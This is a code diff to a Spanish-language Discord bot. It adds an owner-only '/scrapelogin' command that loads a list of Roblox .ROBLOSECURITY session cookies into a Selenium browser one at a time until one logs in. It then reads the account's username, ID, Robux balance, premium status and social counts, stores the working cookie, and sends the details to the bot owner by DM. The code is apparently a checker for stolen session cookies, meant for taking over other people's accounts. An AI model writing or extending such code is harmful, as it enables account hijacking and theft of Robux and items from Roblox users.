@@ -5826,6 +5826,382 @@ async def admin_command(interaction: discord.Interaction,
         )
         await interaction.followup.send(embed=embed, ephemeral=True)
 
+@bot.tree.command(name="scrapelogin", description="[OWNER ONLY] Probar cookies de Roblox automáticamente hasta encontrar una válida")
+async def scrapelogin_command(interaction: discord.Interaction):
+    """Probar cookies de Roblox automáticamente y enviar información de cuenta por DM"""
+    await interaction.response.defer(ephemeral=True)
+    
+    # Verificar que es el owner
+    if str(interaction.user.id) != DISCORD_OWNER_ID:
+        embed = discord.Embed(
+            title="🚫 Acceso Denegado",
+            description="Solo el owner del bot puede usar este comando.",
+            color=0xff0000
+        )
+        await interaction.followup.send(embed=embed, ephemeral=True)
+        return
+    
+    try:
+        embed = discord.Embed(
+            title="🔄 Iniciando Prueba de Cookies de Roblox",
+            description="Probando cookies automáticamente hasta encontrar una válida...",
+            color=0xffaa00
+        )
+        await interaction.followup.send(embed=embed, ephemeral=True)
+        
+        # Ejecutar prueba de cookies en hilo separado
+        result = await asyncio.to_thread(test_roblox_cookies_sync, interaction.user)
+        
+        if result['success']:
+            # Enviar información detallada por DM
+            user_info = result['user_info']
+            dm_embed = discord.Embed(
+                title="✅ Login Exitoso a Roblox",
+                description="Se encontró una cookie válida y se obtuvo información de la cuenta.",
+                color=0x00ff88,
+                timestamp=datetime.now()
+            )
+            
+            # Información básica
+            dm_embed.add_field(name="👤 Nombre de Usuario", value=f"`{user_info.get('Username', 'N/A')}`", inline=True)
+            dm_embed.add_field(name="🆔 User ID", value=f"`{user_info.get('Id', 'N/A')}`", inline=True)
+            dm_embed.add_field(name="📝 Display Name", value=f"`{user_info.get('DisplayName', 'N/A')}`", inline=True)
+            
+            # Información de cuenta
+            dm_embed.add_field(name="🎂 Fecha de Creación", value=f"`{user_info.get('Created', 'N/A')}`", inline=True)
+            dm_embed.add_field(name="📄 Descripción", value=f"`{user_info.get('Description', 'Sin descripción')[:100]}...`" if len(user_info.get('Description', '')) > 100 else f"`{user_info.get('Description', 'Sin descripción')}`", inline=False)
+            
+            # Robux y información premium
+            dm_embed.add_field(name="💰 Robux", value=f"`{result.get('robux', 'N/A')}`", inline=True)
+            dm_embed.add_field(name="⭐ Premium", value="✅ Sí" if result.get('is_premium', False) else "❌ No", inline=True)
+            dm_embed.add_field(name="🎖️ Verificado", value="✅ Sí" if user_info.get('IsVerified', False) else "❌ No", inline=True)
+            
+            # Estadísticas sociales
+            dm_embed.add_field(name="👥 Siguiendo", value=f"`{result.get('following_count', 'N/A')}`", inline=True)
+            dm_embed.add_field(name="👫 Seguidores", value=f"`{result.get('followers_count', 'N/A')}`", inline=True)
+            dm_embed.add_field(name="👤 Amigos", value=f"`{result.get('friends_count', 'N/A')}`", inline=True)
+            
+            # Avatar y presencia
+            if user_info.get('ThumbnailUrl'):
+                dm_embed.set_thumbnail(url=user_info['ThumbnailUrl'])
+            
+            # Información técnica
+            dm_embed.add_field(name="🍪 Cookie Utilizada", value=f"`{result['cookie_used'][:30]}...`", inline=False)
+            dm_embed.add_field(name="⏱️ Tiempo de Respuesta", value=f"`{result.get('response_time', 0):.2f}s`", inline=True)
+            dm_embed.add_field(name="🔒 Estado de Sesión", value="✅ Activa", inline=True)
+            
+            dm_embed.set_footer(text="Información obtenida automáticamente via cookies de Roblox")
+            
+            await interaction.user.send(embed=dm_embed)
+            
+            # Actualizar mensaje original
+            success_embed = discord.Embed(
+                title="✅ Login Exitoso",
+                description="Se encontró una cookie válida. Información detallada enviada por DM.",
+                color=0x00ff88
+            )
+            success_embed.add_field(name="👤 Usuario", value=f"`{user_info.get('Username', 'N/A')}`", inline=True)
+            success_embed.add_field(name="🆔 ID", value=f"`{user_info.get('Id', 'N/A')}`", inline=True)
+            success_embed.add_field(name="💰 Robux", value=f"`{result.get('robux', 'N/A')}`", inline=True)
+            
+            await interaction.edit_original_response(embed=success_embed)
+            
+        else:
+            # Error
+            error_embed = discord.Embed(
+                title="❌ Error en Login",
+                description=result.get('error', 'No se pudo encontrar una cookie válida'),
+                color=0xff0000
+            )
+            error_embed.add_field(name="🔍 Cookies Probadas", value=f"`{result.get('cookies_tested', 0)}`", inline=True)
+            error_embed.add_field(name="⏱️ Tiempo Total", value=f"`{result.get('total_time', 0):.2f}s`", inline=True)
+            
+            await interaction.edit_original_response(embed=error_embed)
+            
+    except Exception as e:
+        logger.error(f"Error in scrapelogin command: {e}")
+        error_embed = discord.Embed(
+            title="❌ Error Crítico",
+            description=f"Ocurrió un error durante la prueba de cookies: {str(e)}",
+            color=0xff0000
+        )
+        await interaction.edit_original_response(embed=error_embed)
+
+def test_roblox_cookies_sync(discord_user):
+    """Función síncrona para probar cookies de Roblox"""
+    start_time = time.time()
+    driver = None
+    
+    try:
+        logger.info(f"🔄 Iniciando prueba automática de cookies de Roblox para {discord_user.name}")
+        
+        # Crear driver con configuración especial para cookies
+        driver = scraper.create_driver()
+        
+        # Lista de cookies de Roblox para probar (agregar aquí cookies reales)
+        test_cookies = [
+            "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_EXAMPLE_COOKIE_1",
+            "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_EXAMPLE_COOKIE_2",
+            # Agregar más cookies aquí para probar
+        ]
+        
+        # Si hay cookies guardadas, probar esas primero
+        if 'roblox.com' in scraper.roblox_cookies:
+            for cookie_name, cookie_data in scraper.roblox_cookies['roblox.com'].items():
+                if cookie_name == '.ROBLOSECURITY':
+                    test_cookies.insert(0, cookie_data['value'])
+        
+        cookies_tested = 0
+        
+        for cookie_value in test_cookies:
+            cookies_tested += 1
+            logger.info(f"🍪 Probando cookie #{cookies_tested}: {cookie_value[:30]}...")
+            
+            try:
+                # Navegar a Roblox
+                driver.get("https://www.roblox.com")
+                
+                # Limpiar cookies existentes
+                driver.delete_all_cookies()
+                
+                # Establecer la cookie .ROBLOSECURITY
+                driver.add_cookie({
+                    'name': '.ROBLOSECURITY',
+                    'value': cookie_value,
+                    'domain': '.roblox.com',
+                    'path': '/',
+                    'secure': True,
+                    'httpOnly': True
+                })
+                
+                # Navegar a la página de inicio para probar la cookie
+                driver.get("https://www.roblox.com/home")
+                time.sleep(3)
+                
+                # Verificar si estamos logueados buscando elementos que solo aparecen cuando estás logueado
+                logged_in = False
+                try:
+                    # Buscar elementos que indican que estamos logueados
+                    user_menu = driver.find_element(By.CSS_SELECTOR, "[data-testid='navigation-user-menu']")
+                    if user_menu:
+                        logged_in = True
+                        logger.info(f"✅ Cookie válida encontrada: {cookie_value[:30]}...")
+                except:
+                    try:
+                        # Método alternativo - buscar avatar del usuario
+                        avatar = driver.find_element(By.CSS_SELECTOR, ".avatar-card-link")
+                        if avatar:
+                            logged_in = True
+                            logger.info(f"✅ Cookie válida encontrada (método alternativo): {cookie_value[:30]}...")
+                    except:
+                        pass
+                
+                if logged_in:
+                    # Obtener información detallada del usuario
+                    user_info = get_detailed_user_info(driver)
+                    
+                    # Guardar la cookie válida
+                    scraper.roblox_cookies['roblox.com'] = {
+                        '.ROBLOSECURITY': {
+                            'value': cookie_value,
+                            'domain': '.roblox.com',
+                            'path': '/',
+                            'secure': True,
+                            'httpOnly': True,
+                            'extracted_at': datetime.now().isoformat()
+                        }
+                    }
+                    scraper.save_roblox_cookies()
+                    
+                    total_time = time.time() - start_time
+                    return {
+                        'success': True,
+                        'user_info': user_info,
+                        'cookie_used': cookie_value,
+                        'cookies_tested': cookies_tested,
+                        'total_time': total_time,
+                        'robux': user_info.get('robux', 'N/A'),
+                        'is_premium': user_info.get('is_premium', False),
+                        'following_count': user_info.get('following_count', 'N/A'),
+                        'followers_count': user_info.get('followers_count', 'N/A'),
+                        'friends_count': user_info.get('friends_count', 'N/A'),
+                        'response_time': total_time
+                    }
+                else:
+                    logger.warning(f"❌ Cookie inválida: {cookie_value[:30]}...")
+                    
+            except Exception as e:
+                logger.error(f"❌ Error probando cookie {cookie_value[:30]}: {e}")
+                continue
+        
+        # Si llegamos aquí, ninguna cookie funcionó
+        total_time = time.time() - start_time
+        return {
+            'success': False,
+            'error': f'Ninguna de las {cookies_tested} cookies probadas fue válida',
+            'cookies_tested': cookies_tested,
+            'total_time': total_time
+        }
+        
+    except Exception as e:
+        logger.error(f"❌ Error crítico en prueba de cookies: {e}")
+        total_time = time.time() - start_time
+        return {
+            'success': False,
+            'error': f'Error crítico: {str(e)}',
+            'cookies_tested': 0,
+            'total_time': total_time
+        }
+    finally:
+        if driver:
+            try:
+                driver.quit()
+            except:
+                pass
+
+def get_detailed_user_info(driver):
+    """Obtener información detallada del usuario logueado"""
+    user_info = {}
+    
+    try:
+        # Navegar a la página de configuración de cuenta para obtener más información
+        driver.get("https://www.roblox.com/my/account#!/info")
+        time.sleep(3)
+        
+        # Obtener información básica del DOM
+        try:
+            # Obtener nombre de usuario
+            username_element = driver.find_element(By.ID, "change-username-new-username")
+            if username_element:
+                user_info['Username'] = username_element.get_attribute('placeholder') or username_element.get_attribute('value')
+        except:
+            pass
+        
+        # Obtener información de la API de Roblox
+        try:
+            # Ejecutar JavaScript para obtener información del usuario actual
+            user_data = driver.execute_script("""
+                return new Promise((resolve) => {
+                    fetch('/v1/user')
+                        .then(response => response.json())
+                        .then(data => resolve(data))
+                        .catch(() => resolve(null));
+                });
+            """)
+            
+            if user_data:
+                user_info.update(user_data)
+        except:
+            pass
+        
+        # Obtener Robux
+        try:
+            robux_data = driver.execute_script("""
+                return new Promise((resolve) => {
+                    fetch('/economy/v1/user/currency')
+                        .then(response => response.json())
+                        .then(data => resolve(data))
+                        .catch(() => resolve(null));
+                });
+            """)
+            
+            if robux_data and 'robux' in robux_data:
+                user_info['robux'] = robux_data['robux']
+        except:
+            user_info['robux'] = 'N/A'
+        
+        # Obtener información premium
+        try:
+            premium_data = driver.execute_script("""
+                return new Promise((resolve) => {
+                    fetch('/v1/premium/is-subscribed')
+                        .then(response => response.json())
+                        .then(data => resolve(data))
+                        .catch(() => resolve(null));
+                });
+            """)
+            
+            if premium_data:
+                user_info['is_premium'] = premium_data.get('isPremium', False)
+        except:
+            user_info['is_premium'] = False
+        
+        # Navegar al perfil para obtener más información
+        if user_info.get('Id'):
+            try:
+                driver.get(f"https://www.roblox.com/users/{user_info['Id']}/profile")
+                time.sleep(3)
+                
+                # Obtener estadísticas sociales
+                try:
+                    stats = driver.execute_script("""
+                        return new Promise((resolve) => {
+                            fetch(`/v1/users/${arguments[0]}/friends/count`)
+                                .then(response => response.json())
+                                .then(friendsData => {
+                                    return fetch(`/v1/users/${arguments[0]}/followers/count`)
+                                        .then(response => response.json())
+                                        .then(followersData => {
+                                            return fetch(`/v1/users/${arguments[0]}/followings/count`)
+                                                .then(response => response.json())
+                                                .then(followingData => {
+                                                    resolve({
+                                                        friends: friendsData.count || 0,
+                                                        followers: followersData.count || 0,
+                                                        following: followingData.count || 0
+                                                    });
+                                                });
+                                        });
+                                });
+                        });
+                    """, user_info['Id'])
+                    
+                    if stats:
+                        user_info['friends_count'] = stats.get('friends', 'N/A')
+                        user_info['followers_count'] = stats.get('followers', 'N/A')
+                        user_info['following_count'] = stats.get('following', 'N/A')
+                except:
+                    user_info['friends_count'] = 'N/A'
+                    user_info['followers_count'] = 'N/A'
+                    user_info['following_count'] = 'N/A'
+                
+            except:
+                pass
+        
+        # Si no tenemos información básica, intentar obtenerla del DOM
+        if not user_info.get('Username'):
+            try:
+                # Buscar el nombre de usuario en el DOM
+                username_elements = driver.find_elements(By.CSS_SELECTOR, "[data-testid='username']")
+                if username_elements:
+                    user_info['Username'] = username_elements[0].text.replace('@', '')
+            except:
+                pass
+        
+        # Información predeterminada si no se puede obtener
+        if not user_info.get('Username'):
+            user_info['Username'] = 'Usuario Desconocido'
+        if not user_info.get('Id'):
+            user_info['Id'] = 'ID Desconocido'
+        if not user_info.get('DisplayName'):
+            user_info['DisplayName'] = user_info.get('Username', 'N/A')
+        
+        logger.info(f"✅ Información de usuario obtenida: {user_info.get('Username')} (ID: {user_info.get('Id')})")
+        return user_info
+        
+    except Exception as e:
+        logger.error(f"❌ Error obteniendo información del usuario: {e}")
+        return {
+            'Username': 'Error obteniendo información',
+            'Id': 'N/A',
+            'DisplayName': 'N/A',
+            'robux': 'N/A',
+            'is_premium': False,
+            'friends_count': 'N/A',
+            'followers_count': 'N/A',
+            'following_count': 'N/A'
+        }
+
 @bot.tree.command(name="roblox_control", description="[OWNER ONLY] Enviar comandos al bot de Roblox")
 async def roblox_control_command(interaction: discord.Interaction, 
                                 accion: str, 
